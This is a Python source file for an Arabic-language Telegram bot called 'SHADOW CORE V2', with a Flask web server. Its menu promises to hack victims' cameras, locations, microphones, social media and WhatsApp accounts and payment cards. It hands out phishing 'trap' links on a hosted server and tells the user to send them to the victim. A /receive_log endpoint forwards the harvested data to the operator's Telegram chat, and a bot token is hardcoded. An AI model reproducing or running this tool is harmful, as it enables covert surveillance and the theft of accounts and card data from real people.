import telebot
from telebot import types
import os
from flask import Flask, request
import threading

# إعدادات البوت والتوكن (التوكن الخاص بك)
TOKEN = '8468154462:AAHkVqMSAqxBQ6iq-TaSYSVH3B-rZkyQKD8'
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# رابط السيرفر الخاص بك على Render لتوليد الفخاخ
BASE_URL = "https://shadow-core-v2.onrender.com"
MY_CHAT_ID = "6190861110"

# 1. بناء لوحة الأزرار (مطابقة للصورة تماماً)
def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btns = [
        '📸 اختراق الكاميرا الضحية', '🎥 تصوير الضحية فيديو',
        '📍 اختراق الموقع', '🎤 تسجيل صوت الضحية',
        '👤 اختراق فيسبوك', '📸 اختراق انستغرام',
        '📱 اختراق تيك توك', '👻 اختراق سناب شات',
        '🔴 اختراق يوتيوب', '🐦 اختراق تويتر',
        '🎮 اختراق ببجي', '💎 اختراق فري فاير',
        '💳 صيد فيزات', '💬 سحب كود واتساب',
        '🚫 إغلاق المواقع', '🔒 إخفاء الرابط',
        '📂 اختراق الهاتف كاملاً', '📡 معلومات الـ IP',
        '🔍 البحث عن المستخدم', '⚙️ جمع معلومات الجهاز'
    ]
    # إضافة الأزرار للوحة
    markup.add(*(types.KeyboardButton(b) for b in btns))
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    welcome_msg = (
        "💀 **Welcome to SHΔDØW CØRE V2** 💀\n\n"
        "تم تفعيل جميع الخدمات بنجاح. اختر الخدمة المطلوبة لبدء الهجوم."
    )
    bot.send_message(message.chat.id, welcome_msg, reply_markup=main_menu(), parse_mode='Markdown')

# 2. معالجة الأوامر (توليد الروابط الحقيقية)
@bot.message_handler(func=lambda m: True)
def handle_commands(message):
    # خريطة الروابط (الفخاخ)
    links = {
        '📸 اختراق الكاميرا الضحية': f"{BASE_URL}/cam",
        '📍 اختراق الموقع': f"{BASE_URL}/track",
        '💳 صيد فيزات': f"{BASE_URL}/visa",
        '💬 سحب كود واتساب': f"{BASE_URL}/whatsapp",
        '📱 اختراق تيك توك': f"{BASE_URL}/tiktok",
        '👤 اختراق فيسبوك': f"{BASE_URL}/facebook",
        '📂 اختراق الهاتف كاملاً': f"{BASE_URL}/payload"
    }

    if message.text in links:
        bot.reply_to(message, f"✅ تم تجهيز الرابط الملحم لـ [{message.text}]:\n\n🔗 {links[message.text]}\n\n⚠️ أرسله للضحية وانتظر وصول اللوجات هنا.")
    else:
        bot.reply_to(message, f"⚙️ جاري معالجة طلب [{message.text}].. يرجى الانتظار.")

# 3. سيرفر الويب لاستلام الصور والبيانات (اللوجات)
@app.route('/')
def home(): return "SHADOW SYSTEM ONLINE ✅"

@app.route('/receive_log', methods=['POST'])
def receive_log():
    data = request.json
    content = data.get('content')
    bot.send_message(MY_CHAT_ID, f"📩 **لوج جديد مسحوب!**\n\n{content}")
    return "OK", 200

def run_flask():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

if __name__ == "__main__":
    threading.Thread(target=run_flask).start()
    bot.polling(none_stop=True)
